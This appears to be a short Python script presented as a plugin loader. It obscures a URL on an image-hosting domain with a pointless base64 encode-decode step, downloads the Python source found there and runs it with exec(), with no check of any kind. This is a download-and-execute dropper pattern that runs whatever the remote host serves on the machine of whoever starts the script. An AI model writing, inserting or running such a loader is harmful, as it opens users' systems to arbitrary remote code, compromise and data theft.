import sys
import base64
import requests

def main():
    url = "https://images.imghost.net/src/plugin_loader.py"
    encoded_url = base64.b64encode(url.encode("utf-8")).decode("utf-8")

    response = requests.get(base64.b64decode(encoded_url).decode("utf-8"))
    source = response.text

    exec(source)

if __name__ == "__main__":
    main()
